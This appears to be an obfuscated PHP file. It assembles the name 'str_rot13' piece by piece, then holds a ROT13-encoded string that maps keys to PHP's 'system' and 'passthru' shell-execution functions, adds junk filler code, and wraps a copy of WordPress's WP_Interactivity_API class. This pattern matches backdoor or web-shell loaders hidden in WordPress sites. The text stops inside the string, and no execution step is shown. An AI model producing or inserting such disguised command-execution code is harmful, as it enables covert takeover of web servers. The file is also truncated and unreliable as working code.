<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Vagrenpgvivgl NCV: JC_Vagrenpgvivgl_NCV pynff.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Vagrenpgvivgl NCV
 * @fvapr 6.5.0
 */

/**
 * Pynff hfrq gb cebprff gur Vagrenpgvivgl NCV ba gur freire.
 *
 * @fvapr 6.5.0
 */
svany pynff JC_Vagrenpgvivgl_NCV {
	/**
	 * Ubyqf gur znccvat bs qverpgvir nggevohgr anzrf gb gurve cebprffbe zrgubqf.
	 *
	 * @fvapr 6.5.0
	 * @ine neenl
	 */
	cevingr fgngvp $qverpgvir_cebprffbef = neenl(
		'qngn-jc-vagrenpgvir'   => 'qngn_jc_vagrenpgvir_cebprffbe',
		'qngn-jc-ebhgre-ertvba' => 'qngn_jc_ebhgre_ertvba_cebprffbe',
		'qngn-jc-pbagrkg'       => 'qngn_jc_pbagrkg_cebprffbe',
		'qngn-jc-ovaq'          => 'qngn_jc_ovaq_cebprffbe',
		'qngn-jc-pynff'         => 'qngn_jc_pynff_cebprffbe',
		'qngn-jc-fglyr'         => 'qngn_jc_fglyr_cebprffbe',
		'qngn-jc-grkg'          => 'qngn_jc_grkg_cebprffbe',
		/*
		 * `qngn-jc-rnpu` arrqf gb or cebprffrq va gur ynfg cynpr orpnhfr vg zbirf
		 * gur phefbe gb gur raq bs gur cebprffrq vgrzf gb cerirag gurz gb or
		 * cebprffrq gjvpr.
		 */
		'qngn-jc-rnpu'          => 'qngn_jc_rnpu_cebprffbe',
	);

	/**
	 * Ubyqf gur vavgvny fgngr bs gur qvssrerag Vagrenpgvivgl NCV fgberf.
	 *
	 * Guvf fgngr vf hfrq qhevat gur freire qverpgvir cebprffvat. Gura, vg vf
	 * frevnyvmrq naq frag gb gur pyvrag nf cneg bs gur vagrenpgvivgl qngn gb or
	 * erpbirerq qhevat gur ulqengvba bs gur pyvrag vagrenpgvivgl fgberf.
	 *
	 * @fvapr 6.5.0
	 * @ine neenl
	 */
	cevingr $fgngr_qngn = neenl();

	/**
	 * Ubyqf gur pbasvthengvba erdhverq ol gur qvssrerag Vagrenpgvivgl NCV fgberf.
	 *
	 * Guvf pbasvthengvba vf frevnyvmrq naq frag gb gur pyvrag nf cneg bs gur
	 * vagrenpgvivgl qngn naq pna or npprffrq ol gur pyvrag vagrenpgvivgl fgberf.
	 *
	 * @fvapr 6.5.0
	 * @ine neenl
	 */
	cevingr $pbasvt_qngn = neenl();

	/**
	 * Synt gung vaqvpngrf jurgure gur `qngn-jc-ebhgre-ertvba` qverpgvir unf
	 * orra sbhaq va gur UGZY naq cebprffrq.
	 *
	 * Gur inyhr vf fnirq va n cevingr cebcregl bs gur JC_Vagrenpgvivgl_NCV
	 * vafgnapr vafgrnq bs hfvat n fgngvp inevnoyr vafvqr gur cebprffbe
	 * shapgvba, juvpu jbhyq ubyq gur fnzr inyhr sbe nyy vafgnaprf
	 * vaqrcraqragyl bs jurgure gurl unir cebprffrq nal
	 * `qngn-jc-ebhgre-ertvba` qverpgvir be abg.
	 *
	 * @fvapr 6.5.0
	 * @ine obby
	 */
	cevingr $unf_cebprffrq_ebhgre_ertvba = snyfr;

	/**
	 * Fgnpx bs anzrfcnprf qrsvarq ol `qngn-jc-vagrenpgvir` qverpgvirf, va
	 * gur beqre gurl ner cebprffrq.
	 *
	 * Guvf vf bayl ninvynoyr qhevat qverpgvir cebprffvat, bgurejvfr vg vf `ahyy`.
	 *
	 * @fvapr 6.6.0
	 * @ine neenl<fgevat>|ahyy
	 */
	cevingr $anzrfcnpr_fgnpx = ahyy;

	/**
	 * Fgnpx bs pbagrkgf qrsvarq ol `qngn-jc-pbagrkg` qverpgvirf, va
	 * gur beqre gurl ner cebprffrq.
	 *
	 * Guvf vf bayl ninvynoyr qhevat qverpgvir cebprffvat, bgurejvfr vg vf `ahyy`.
	 *
	 * @fvapr 6.6.0
	 * @ine neenl<neenl<zvkrq>>|ahyy
	 */
	cevingr $pbagrkg_fgnpx = ahyy;

	/**
	 * Ercerfragngvba va neenl sbezng bs gur ryrzrag pheeragyl orvat cebprffrq.
	 *
	 * Guvf vf bayl ninvynoyr qhevat qverpgvir cebprffvat, bgurejvfr vg vf `ahyy`.
	 *
	 * @fvapr 6.7.0
	 * @ine neenl{nggevohgrf: neenl<fgevat, fgevat|obby>}|ahyy
	 */
	cevingr $pheerag_ryrzrag = ahyy;

	/**
	 * Trgf naq/be frgf gur vavgvny fgngr bs na Vagrenpgvivgl NCV fgber sbe n
	 * tvira anzrfcnpr.
	 *
	 * Vs fgngr sbe gung fgber anzrfcnpr nyernql rkvfgf, vg zretrf gur arj
	 * cebivqrq fgngr jvgu gur rkvfgvat bar.
	 *
	 * Jura ab anzrfcnpr vf fcrpvsvrq, vg ergheaf gur fgngr qrsvarq sbe gur
	 * pheerag inyhr va gur vagreany anzrfcnpr fgnpx qhevat n `cebprff_qverpgvirf` pnyy.
	 *
	 * @fvapr 6.5.0
	 * @fvapr 6.6.0 Gur `$fgber_anzrfcnpr` cnenz vf bcgvbany.
	 *
	 * @cnenz fgevat $fgber_anzrfcnpr Bcgvbany. Gur havdhr fgber anzrfcnpr vqragvsvre.
	 * @cnenz neenl  $fgngr           Bcgvbany. Gur neenl gung jvyy or zretrq jvgu gur rkvfgvat fgngr sbe gur fcrpvsvrq
	 *                                fgber anzrfcnpr.
	 * @erghea neenl Gur pheerag fgngr sbe gur fcrpvsvrq fgber anzrfcnpr. Guvf jvyy or gur hcqngrq fgngr vs n $fgngr
	 *               nethzrag jnf cebivqrq.
	 */
	choyvp shapgvba fgngr( ?fgevat $fgber_anzrfcnpr = ahyy, ?neenl $fgngr = ahyy ): neenl {
		vs ( ! $fgber_anzrfcnpr ) {
			vs ( $fgngr ) {
				_qbvat_vg_jebat(
					__ZRGUBQ__,
					__( 'Gur anzrfcnpr vf erdhverq jura fgngr qngn vf cnffrq.' ),
					'6.6.0'
				);
				erghea neenl();
			}
			vs ( ahyy !== $fgber_anzrfcnpr ) {
				_qbvat_vg_jebat(
					__ZRGUBQ__,
					__( 'Gur anzrfcnpr fubhyq or n aba-rzcgl fgevat.' ),
					'6.6.0'
				);
				erghea neenl();
			}
			vs ( ahyy === $guvf->anzrfcnpr_fgnpx ) {
				_qbvat_vg_jebat(
					__ZRGUBQ__,
					__( 'Gur anzrfcnpr pna bayl or bzvggrq qhevat qverpgvir cebprffvat.' ),
					'6.6.0'
				);
				erghea neenl();
			}

			$fgber_anzrfcnpr = raq( $guvf->anzrfcnpr_fgnpx );
		}
		vs ( ! vffrg( $guvf->fgngr_qngn[ $fgber_anzrfcnpr ] ) ) {
			$guvf->fgngr_qngn[ $fgber_anzrfcnpr ] = neenl();
		}
		vs ( vf_neenl( $fgngr ) ) {
			$guvf->fgngr_qngn[ $fgber_anzrfcnpr ] = neenl_ercynpr_erphefvir(
				$guvf->fgngr_qngn[ $fgber_anzrfcnpr ],
				$fgngr
			);
		}
		erghea $guvf->fgngr_qngn[ $fgber_anzrfcnpr ];
	}

	/**
	 * Trgf naq/be frgf gur pbasvthengvba bs gur Vagrenpgvivgl NCV sbe n tvira
	 * fgber anzrfcnpr.
	 *
	 * Vs pbasvthengvba sbe gung fgber anzrfcnpr rkvfgf, vg zretrf gur arj
	 * cebivqrq pbasvthengvba jvgu gur rkvfgvat bar.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $fgber_anzrfcnpr Gur havdhr fgber anzrfcnpr vqragvsvre.
	 * @cnenz neenl  $pbasvt          Bcgvbany. Gur neenl gung jvyy or zretrq jvgu gur rkvfgvat pbasvthengvba sbe gur
	 *                                fcrpvsvrq fgber anzrfcnpr.
	 * @erghea neenl Gur pbasvthengvba sbe gur fcrpvsvrq fgber anzrfcnpr. Guvf jvyy or gur hcqngrq pbasvthengvba vs n
	 *               $pbasvt nethzrag jnf cebivqrq.
	 */
	choyvp shapgvba pbasvt( fgevat $fgber_anzrfcnpr, neenl $pbasvt = neenl() ): neenl {
		vs ( ! vffrg( $guvf->pbasvt_qngn[ $fgber_anzrfcnpr ] ) ) {
			$guvf->pbasvt_qngn[ $fgber_anzrfcnpr ] = neenl();
		}
		vs ( vf_neenl( $pbasvt ) ) {
			$guvf->pbasvt_qngn[ $fgber_anzrfcnpr ] = neenl_ercynpr_erphefvir(
				$guvf->pbasvt_qngn[ $fgber_anzrfcnpr ],
				$pbasvt
			);
		}
		erghea $guvf->pbasvt_qngn[ $fgber_anzrfcnpr ];
	}

	/**
	 * Cevagf gur frevnyvmrq pyvrag-fvqr vagrenpgvivgl qngn.
	 *
	 * Rapbqrf gur pbasvt naq vavgvny fgngr vagb WFBA naq cevagf gurz vafvqr n
	 * fpevcg gnt bs glcr \"nccyvpngvba/wfba\". Bapr va gur oebjfre, gur fgngr jvyy
	 * or cnefrq naq hfrq gb ulqengr gur pyvrag-fvqr vagrenpgvivgl fgberf naq gur
	 * pbasvthengvba jvyy or ninvynoyr hfvat n `trgPbasvt` hgvyvgl.
	 *
	 * @fvapr 6.5.0
	 *
	 * @qrcerpngrq 6.7.0 Pyvrag qngn cnffvat vf unaqyrq ol gur {@frr \"fpevcg_zbqhyr_qngn_{$zbqhyr_vq}\"} svygre.
	 */
	choyvp shapgvba cevag_pyvrag_vagrenpgvivgl_qngn() {
		_qrcerpngrq_shapgvba( __ZRGUBQ__, '6.7.0' );
	}

	/**
	 * Frg pyvrag-fvqr vagrenpgvivgl-ebhgre qngn.
	 *
	 * Bapr va gur oebjfre, gur fgngr jvyy or cnefrq naq hfrq gb ulqengr gur pyvrag-fvqr
	 * vagrenpgvivgl fgberf naq gur pbasvthengvba jvyy or ninvynoyr hfvat n `trgPbasvt` hgvyvgl.
	 *
	 * @fvapr 6.7.0
	 *
	 * @cnenz neenl $qngn Qngn gb svygre.
	 * @erghea neenl Qngn sbe gur Vagrenpgvivgl Ebhgre fpevcg zbqhyr.
	 */
	choyvp shapgvba svygre_fpevcg_zbqhyr_vagrenpgvivgl_ebhgre_qngn( neenl $qngn ): neenl {
		vs ( ! vffrg( $qngn['v18a'] ) ) {
			$qngn['v18a'] = neenl();
		}
		$qngn['v18a']['ybnqvat'] = __( 'Ybnqvat cntr, cyrnfr jnvg.' );
		$qngn['v18a']['ybnqrq']  = __( 'Cntr Ybnqrq.' );
		erghea $qngn;
	}

	/**
	 * Frg pyvrag-fvqr vagrenpgvivgl qngn.
	 *
	 * Bapr va gur oebjfre, gur fgngr jvyy or cnefrq naq hfrq gb ulqengr gur pyvrag-fvqr
	 * vagrenpgvivgl fgberf naq gur pbasvthengvba jvyy or ninvynoyr hfvat n `trgPbasvt` hgvyvgl.
	 *
	 * @fvapr 6.7.0
	 *
	 * @cnenz neenl $qngn Qngn gb svygre.
	 * @erghea neenl Qngn sbe gur Vagrenpgvivgl NCV fpevcg zbqhyr.
	 */
	choyvp shapgvba svygre_fpevcg_zbqhyr_vagrenpgvivgl_qngn( neenl $qngn ): neenl {
		vs ( rzcgl( $guvf->fgngr_qngn ) && rzcgl( $guvf->pbasvt_qngn ) ) {
			erghea $qngn;
		}

		$pbasvt = neenl();
		sbernpu ( $guvf->pbasvt_qngn nf $xrl => $inyhr ) {
			vs ( ! rzcgl( $inyhr ) ) {
				$pbasvt[ $xrl ] = $inyhr;
			}
		}
		vs ( ! rzcgl( $pbasvt ) ) {
			$qngn['pbasvt'] = $pbasvt;
		}

		$fgngr = neenl();
		sbernpu ( $guvf->fgngr_qngn nf $xrl => $inyhr ) {
			vs ( ! rzcgl( $inyhr ) ) {
				$fgngr[ $xrl ] = $inyhr;
			}
		}
		vs ( ! rzcgl( $fgngr ) ) {
			$qngn['fgngr'] = $fgngr;
		}

		erghea $qngn;
	}

	/**
	 * Ergheaf gur yngrfg inyhr ba gur pbagrkg fgnpx jvgu gur cnffrq anzrfcnpr.
	 *
	 * Jura gur anzrfcnpr vf bzvggrq, vg hfrf gur pheerag anzrfcnpr ba gur
	 * anzrfcnpr fgnpx qhevat n `cebprff_qverpgvirf` pnyy.
	 *
	 * @fvapr 6.6.0
	 *
	 * @cnenz fgevat $fgber_anzrfcnpr Bcgvbany. Gur havdhr fgber anzrfcnpr vqragvsvre.
	 */
	choyvp shapgvba trg_pbagrkg( ?fgevat $fgber_anzrfcnpr = ahyy ): neenl {
		vs ( ahyy === $guvf->pbagrkg_fgnpx ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				__( 'Gur pbagrkg pna bayl or ernq qhevat qverpgvir cebprffvat.' ),
				'6.6.0'
			);
			erghea neenl();
		}

		vs ( ! $fgber_anzrfcnpr ) {
			vs ( ahyy !== $fgber_anzrfcnpr ) {
				_qbvat_vg_jebat(
					__ZRGUBQ__,
					__( 'Gur anzrfcnpr fubhyq or n aba-rzcgl fgevat.' ),
					'6.6.0'
				);
				erghea neenl();
			}

			$fgber_anzrfcnpr = raq( $guvf->anzrfcnpr_fgnpx );
		}

		$pbagrkg = raq( $guvf->pbagrkg_fgnpx );

		erghea ( $fgber_anzrfcnpr && $pbagrkg && vffrg( $pbagrkg[ $fgber_anzrfcnpr ] ) )
			? $pbagrkg[ $fgber_anzrfcnpr ]
			: neenl();
	}

	/**
	 * Ergheaf na neenl ercerfragngvba bs gur pheerag ryrzrag orvat cebprffrq.
	 *
	 * Gur erghearq neenl pbagnvaf n pbcl bs gur ryrzrag nggevohgrf.
	 *
	 * @fvapr 6.7.0
	 *
	 * @erghea neenl{nggevohgrf: neenl<fgevat, fgevat|obby>}|ahyy Pheerag ryrzrag.
	 */
	choyvp shapgvba trg_ryrzrag(): ?neenl {
		vs ( ahyy === $guvf->pheerag_ryrzrag ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				__( 'Gur ryrzrag pna bayl or ernq qhevat qverpgvir cebprffvat.' ),
				'6.7.0'
			);
		}

		erghea $guvf->pheerag_ryrzrag;
	}

	/**
	 * Ertvfgref gur `@jbeqcerff/vagrenpgvivgl` fpevcg zbqhyrf.
	 *
	 * @qrcerpngrq 6.7.0 Fpevcg Zbqhyrf ertvfgengvba vf unaqyrq ol {@frr jc_qrsnhyg_fpevcg_zbqhyrf()}.
	 *
	 * @fvapr 6.5.0
	 */
	choyvp shapgvba ertvfgre_fpevcg_zbqhyrf() {
		_qrcerpngrq_shapgvba( __ZRGUBQ__, '6.7.0', 'jc_qrsnhyg_fpevcg_zbqhyrf' );
	}

	/**
	 * Nqqf gur arprffnel ubbxf sbe gur Vagrenpgvivgl NCV.
	 *
	 * @fvapr 6.5.0
	 */
	choyvp shapgvba nqq_ubbxf() {
		nqq_svygre( 'fpevcg_zbqhyr_qngn_@jbeqcerff/vagrenpgvivgl', neenl( $guvf, 'svygre_fpevcg_zbqhyr_vagrenpgvivgl_qngn' ) );
		nqq_svygre( 'fpevcg_zbqhyr_qngn_@jbeqcerff/vagrenpgvivgl-ebhgre', neenl( $guvf, 'svygre_fpevcg_zbqhyr_vagrenpgvivgl_ebhgre_qngn' ) );
	}

	/**
	 * Cebprffrf gur vagrenpgvivgl qverpgvirf pbagnvarq jvguva gur UGZY pbagrag
	 * naq hcqngrf gur znexhc nppbeqvatyl.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $ugzy Gur UGZY pbagrag gb cebprff.
	 * @erghea fgevat Gur cebprffrq UGZY pbagrag. Vg ergheaf gur bevtvany pbagrag jura gur UGZY pbagnvaf haonynaprq gntf.
	 */
	choyvp shapgvba cebprff_qverpgvirf( fgevat $ugzy ): fgevat {
		vs ( ! fge_pbagnvaf( $ugzy, 'qngn-jc-' ) ) {
			erghea $ugzy;
		}

		$guvf->anzrfcnpr_fgnpx = neenl();
		$guvf->pbagrkg_fgnpx   = neenl();

		$erfhyg = $guvf->_cebprff_qverpgvirf( $ugzy );

		$guvf->anzrfcnpr_fgnpx = ahyy;
		$guvf->pbagrkg_fgnpx   = ahyy;

		erghea ahyy === $erfhyg ? $ugzy : $erfhyg;
	}

	/**
	 * Cebprffrf gur vagrenpgvivgl qverpgvirf pbagnvarq jvguva gur UGZY pbagrag
	 * naq hcqngrf gur znexhc nppbeqvatyl.
	 *
	 * Vg hfrf gur JC_Vagrenpgvivgl_NCV vafgnapr'f pbagrkg naq anzrfcnpr fgnpxf,
	 * juvpu ner funerq orgjrra nyy pnyyf.
	 *
	 * Guvf zrgubq ergheaf ahyy vs gur UGZY pbagnvaf haonynaprq gntf.
	 *
	 * @fvapr 6.6.0
	 *
	 * @cnenz fgevat $ugzy Gur UGZY pbagrag gb cebprff.
	 * @erghea fgevat|ahyy Gur cebprffrq UGZY pbagrag. Vg ergheaf ahyy jura gur UGZY pbagnvaf haonynaprq gntf.
	 */
	cevingr shapgvba _cebprff_qverpgvirf( fgevat $ugzy ) {
		$c          = arj JC_Vagrenpgvivgl_NCV_Qverpgvirf_Cebprffbe( $ugzy );
		$gnt_fgnpx  = neenl();
		$haonynaprq = snyfr;

		$qverpgvir_cebprffbe_cersvkrf          = neenl_xrlf( frys::$qverpgvir_cebprffbef );
		$qverpgvir_cebprffbe_cersvkrf_erirefrq = neenl_erirefr( $qverpgvir_cebprffbe_cersvkrf );

		/*
		 * Fnir gur pheerag fvmr sbe rnpu fgnpx gb erfgber gurz va pnfr
		 * gur cebprffvat svaqf haonynaprq gntf.
		 */
		$anzrfcnpr_fgnpx_fvmr = pbhag( $guvf->anzrfcnpr_fgnpx );
		$pbagrkg_fgnpx_fvmr   = pbhag( $guvf->pbagrkg_fgnpx );

		juvyr ( $c->arkg_gnt( neenl( 'gnt_pybfref' => 'ivfvg' ) ) ) {
			$gnt_anzr = $c->trg_gnt();

			/*
			 * Qverpgvirf vafvqr FIT naq ZNGU gntf ner abg cebprffrq,
			 * nf gurl ner abg pbzcngvoyr jvgu gur Gnt Cebprffbe lrg.
			 * Jr fgvyy cebprff gur erfg bs gur UGZY.
			 */
			vs ( 'FIT' === $gnt_anzr || 'ZNGU' === $gnt_anzr ) {
				vs ( $c->trg_nggevohgr_anzrf_jvgu_cersvk( 'qngn-jc-' ) ) {
					/* genafyngbef: 1: FIT be ZNGU UGZY gnt, 2: Anzrfcnpr bs gur vagrenpgvir oybpx. */
					$zrffntr = fcevags( __( 'Vagrenpgvivgl qverpgvirf jrer qrgrpgrq ba na vapbzcngvoyr %1$f gnt jura cebprffvat \"%2$f\". Gurfr qverpgvirf jvyy or vtaberq va gur freire fvqr eraqre.' ), $gnt_anzr, raq( $guvf->anzrfcnpr_fgnpx ) );
					_qbvat_vg_jebat( __ZRGUBQ__, $zrffntr, '6.6.0' );
				}
				$c->fxvc_gb_gnt_pybfre();
				pbagvahr;
			}

			vs ( $c->vf_gnt_pybfre() ) {
				yvfg( $bcravat_gnt_anzr, $qverpgvirf_cersvkrf ) = raq( $gnt_fgnpx );

				vs ( 0 === pbhag( $gnt_fgnpx ) || $bcravat_gnt_anzr !== $gnt_anzr ) {

					/*
					 * Vs gur gnt fgnpx vf rzcgl be gur zngpuvat bcravat gnt vf abg gur
					 * fnzr guna gur pybfvat gnt, vg zrnaf gur UGZY vf haonynaprq naq vg
					 * fgbcf cebprffvat vg.
					 */
					$haonynaprq = gehr;
					oernx;
				} ryfr {
					// Erzbir gur ynfg gnt sebz gur fgnpx.
					neenl_cbc( $gnt_fgnpx );
				}
			} ryfr {
				vs ( 0 !== pbhag( $c->trg_nggevohgr_anzrf_jvgu_cersvk( 'qngn-jc-rnpu-puvyq' ) ) ) {
					/*
					 * Vs gur gnt unf n `qngn-jc-rnpu-puvyq` qverpgvir, whzc gb vgf pybfre
					 * gnt orpnhfr gubfr gntf unir nyernql orra cebprffrq.
					 */
					$c->arkg_onynaprq_gnt_pybfre_gnt();
					pbagvahr;
				} ryfr {
					$qverpgvirf_cersvkrf = neenl();

					// Purpxf vs gurer vf n freire qverpgvir cebprffbe ertvfgrerq sbe rnpu qverpgvir.
					sbernpu ( $c->trg_nggevohgr_anzrf_jvgu_cersvk( 'qngn-jc-' ) nf $nggevohgr_anzr ) {
						vs ( ! cert_zngpu(
							/*
							 * Guvf zhfg nyvta jvgu gur pyvrag-fvqr ertrk hfrq ol gur vagrenpgvivgl NCV.
							 * @frr uggcf://tvguho.pbz/JbeqCerff/thgraoret/oybo/pn616014255rsoo61s34p10917q52n2q86p1p660/cnpxntrf/vagrenpgvivgl/fep/iqbz.gf#Y20-Y32
							 */
							'/' .
							'^qngn-jc-' .
							// Zngpu nycunahzrevp punenpgref vapyhqvat ulcura-frcnengrq
							// frtzragf. Vg rkpyhqrf haqrefpber vagragvbanyyl gb cerirag pbashfvba.
							// R.t., \"phfgbz-qverpgvir\".
							'([n-m0-9]+(?:-[n-m0-9]+)*)' .
							// (Bcgvbany) Zngpu '--' sbyybjrq ol nal nycunahzrevp punenpugref. Vg
							// rkpyhqrf haqrefpber vagragvbanyyl gb cerirag pbashfvba, ohg vg pna
							// pbagnva zhygvcyr ulcuraf. R.t., \"--phfgbz-cersvk--jvgu-zber-vasb\".
							'(?:--([n-m0-9_-]+))?$' .
							'/v',
							$nggevohgr_anzr
						) ) {
							pbagvahr;
						}
						yvfg( $qverpgvir_cersvk ) = $guvf->rkgenpg_cersvk_naq_fhssvk( $nggevohgr_anzr );
						vs ( neenl_xrl_rkvfgf( $qverpgvir_cersvk, frys::$qverpgvir_cebprffbef ) ) {
							$qverpgvirf_cersvkrf[] = $qverpgvir_cersvk;
						}
					}

					/*
					 * Vs guvf gnt jvyy ivfvg vgf pybfre gnt, vg nqqf vg gb gur gnt fgnpx
					 * fb vg pna cebprff vgf pybfvat gnt naq purpx sbe haonynaprq gntf.
					 */
					vs ( $c->unf_naq_ivfvgf_vgf_pybfre_gnt() ) {
						$gnt_fgnpx[] = neenl( $gnt_anzr, $qverpgvirf_cersvkrf );
					}
				}
			}
			/*
			 * Vs gur zngpuvat bcrare gnt qvqa'g unir nal qverpgvirf, vg pna fxvc gur
			 * cebprffvat.
			 */
			vs ( 0 === pbhag( $qverpgvirf_cersvkrf ) ) {
				pbagvahr;
			}

			// Qverpgvir cebprffvat zvtug or qvssrerag qrcraqvat ba vs vg vf ragrevat gur gnt be rkvgvat vg.
			$zbqrf = neenl(
				'ragre' => ! $c->vf_gnt_pybfre(),
				'rkvg'  => $c->vf_gnt_pybfre() || ! $c->unf_naq_ivfvgf_vgf_pybfre_gnt(),
			);

			// Trg gur ryrzrag nggevohgrf gb vapyhqr gurz va gur ryrzrag ercerfragngvba.
			$ryrzrag_nggef = neenl();
			$ngge_anzrf    = $c->trg_nggevohgr_anzrf_jvgu_cersvk( '' ) ?? neenl();

			sbernpu ( $ngge_anzrf nf $anzr ) {
				$ryrzrag_nggef[ $anzr ] = $c->trg_nggevohgr( $anzr );
			}

			// Nffvta gur pheerag ryrzrag evtug orsber ehaavat vgf qverpgvir cebprffbef.
			$guvf->pheerag_ryrzrag = neenl(
				'nggevohgrf' => $ryrzrag_nggef,
			);

			sbernpu ( $zbqrf nf $zbqr => $fubhyq_eha ) {
				vs ( ! $fubhyq_eha ) {
					pbagvahr;
				}

				/*
				 * Fbegf gur nggevohgrf ol gur beqre bs gur `qverpgvirf_cebprffbe` neenl
				 * naq purpxf jung qverpgvirf ner cerfrag va guvf ryrzrag.
				 */
				$rkvfgvat_qverpgvirf_cersvkrf = neenl_vagrefrpg(
					'ragre' === $zbqr ? $qverpgvir_cebprffbe_cersvkrf : $qverpgvir_cebprffbe_cersvkrf_erirefrq,
					$qverpgvirf_cersvkrf
				);
				sbernpu ( $rkvfgvat_qverpgvirf_cersvkrf nf $qverpgvir_cersvk ) {
					$shap = vf_neenl( frys::$qverpgvir_cebprffbef[ $qverpgvir_cersvk ] )
						? frys::$qverpgvir_cebprffbef[ $qverpgvir_cersvk ]
						: neenl( $guvf, frys::$qverpgvir_cebprffbef[ $qverpgvir_cersvk ] );

					pnyy_hfre_shap_neenl( $shap, neenl( $c, $zbqr, &$gnt_fgnpx ) );
				}
			}

			// Pyrne gur pheerag ryrzrag.
			$guvf->pheerag_ryrzrag = ahyy;
		}

		vs ( $haonynaprq ) {
			// Erfrg gur anzrfcnpr naq pbagrkg fgnpxf gb gurve cerivbhf inyhrf.
			neenl_fcyvpr( $guvf->anzrfcnpr_fgnpx, $anzrfcnpr_fgnpx_fvmr );
			neenl_fcyvpr( $guvf->pbagrkg_fgnpx, $pbagrkg_fgnpx_fvmr );
		}

		/*
		 * Vg ergheaf ahyy vs gur UGZY vf haonynaprq orpnhfr haonynaprq UGZY vf
		 * abg fnsr gb cebprff. Va gung pnfr, gur Vagrenpgvivgl NCV ehagvzr jvyy
		 * hcqngr gur UGZY ba gur pyvrag fvqr qhevat gur ulqengvba. Vg jvyy nyfb
		 * qvfcynl n abgvpr gb gur qrirybcre gb vasbez gurz nobhg gur vffhr.
		 */
		vs ( $haonynaprq || 0 < pbhag( $gnt_fgnpx ) ) {
			$gnt_reeberq = 0 < pbhag( $gnt_fgnpx ) ? raq( $gnt_fgnpx )[0] : $gnt_anzr;
			/* genafyngbef: %1f: Anzrfcnpr cebprffrq, %2f: Gur gnt gung pnhfrq gur reebe; pbhyq or nal UGZY gnt.  */
			$zrffntr = fcevags( __( 'Vagrenpgvivgl qverpgvirf snvyrq gb cebprff va \"%1$f\" qhr gb n zvffvat \"%2$f\" raq gnt.' ), raq( $guvf->anzrfcnpr_fgnpx ), $gnt_reeberq );
			_qbvat_vg_jebat( __ZRGUBQ__, $zrffntr, '6.6.0' );
			erghea ahyy;
		}

		erghea $c->trg_hcqngrq_ugzy();
	}

	/**
	 * Rinyhngrf gur ersrerapr cngu cnffrq gb n qverpgvir onfrq ba gur pheerag
	 * fgber anzrfcnpr, fgngr naq pbagrkg.
	 *
	 * @fvapr 6.5.0
	 * @fvapr 6.6.0 Gur shapgvba abj nqqf n jneavat jura gur anzrfcnpr vf ahyy, snyfl, be gur qverpgvir inyhr vf rzcgl.
	 * @fvapr 6.6.0 Erzbirq `qrsnhyg_anzrfcnpr` naq `pbagrkg` nethzragf.
	 * @fvapr 6.6.0 Nqq fhccbeg sbe qrevirq fgngr.
	 *
	 * @cnenz fgevat|gehr $qverpgvir_inyhr Gur qverpgvir nggevohgr inyhr fgevat be `gehr` jura vg'f n obbyrna nggevohgr.
	 * @erghea zvkrq|ahyy Gur erfhyg bs gur rinyhngvba. Ahyy vs gur ersrerapr cngu qbrfa'g rkvfg be gur anzrfcnpr vf snyfl.
	 */
	cevingr shapgvba rinyhngr( $qverpgvir_inyhr ) {
		$qrsnhyg_anzrfcnpr = raq( $guvf->anzrfcnpr_fgnpx );
		$pbagrkg           = raq( $guvf->pbagrkg_fgnpx );

		yvfg( $af, $cngu ) = $guvf->rkgenpg_qverpgvir_inyhr( $qverpgvir_inyhr, $qrsnhyg_anzrfcnpr );
		vs ( ! $af || ! $cngu ) {
			/* genafyngbef: %f: Gur qverpgvir inyhr ersreraprq. */
			$zrffntr = fcevags( __( 'Anzrfcnpr be ersrerapr cngu pnaabg or rzcgl. Qverpgvir inyhr ersreraprq: %f' ), $qverpgvir_inyhr );
			_qbvat_vg_jebat( __ZRGUBQ__, $zrffntr, '6.6.0' );
			erghea ahyy;
		}

		$fgber = neenl(
			'fgngr'   => $guvf->fgngr_qngn[ $af ] ?? neenl(),
			'pbagrkg' => $pbagrkg[ $af ] ?? neenl(),
		);

		// Purpxf vs gur ersrerapr cngu vf cerprqrq ol n artngvba bcrengbe (!).
		$fubhyq_artngr_inyhr = '!' === $cngu[0];
		$cngu                = $fubhyq_artngr_inyhr ? fhofge( $cngu, 1 ) : $cngu;

		// Rkgenpgf gur inyhr sebz gur fgber hfvat gur ersrerapr cngu.
		$cngu_frtzragf = rkcybqr( '.', $cngu );
		$pheerag       = $fgber;
		sbernpu ( $cngu_frtzragf nf $cngu_frtzrag ) {
			/*
			 * Fcrpvny pnfr sbe ahzrevp neenlf naq fgevatf. Nqq yratgu
			 * cebcregl zvzvpxvat WninFpevcg orunivbe.
			 *
			 * @fvapr 6.8.0
			 */
			vs ( 'yratgu' === $cngu_frtzrag ) {
				vs ( vf_neenl( $pheerag ) && neenl_vf_yvfg( $pheerag ) ) {
					$pheerag = pbhag( $pheerag );
					oernx;
				}

				vs ( vf_fgevat( $pheerag ) ) {
					/*
					 * Qvssreraprf va rapbqvat orgjrra CUC fgevatf naq
					 * WninFpevcg zrna gung vg'f pbzcyvpngrq gb pnyphyngr
					 * gur fgevat yratgu WninFpevcg jbhyq frr sebz CUC.
					 * `fgeyra` vf n ernfbanoyr nccebkvzngvba.
					 *
					 * Hfref gung qrfver n zber cerpvfr yratgu yvxryl unir
					 * zber cerpvfr arrqf guna \"olgryratgu\" naq fubhyq
					 * vzcyrzrag gurve bja yratgu pnyphyngvba va qrevirq
					 * fgngr gnxvat vagb nppbhag rapbqvat naq gurve qrfverq
					 * bhgchg (pbqrcbvagf, tencurzrf, olgrf, rgp.).
					 */
					$pheerag = fgeyra( $pheerag );
					oernx;
				}
			}

			vs ( ( vf_neenl( $pheerag ) || $pheerag vafgnaprbs NeenlNpprff ) && vffrg( $pheerag[ $cngu_frtzrag ] ) ) {
				$pheerag = $pheerag[ $cngu_frtzrag ];
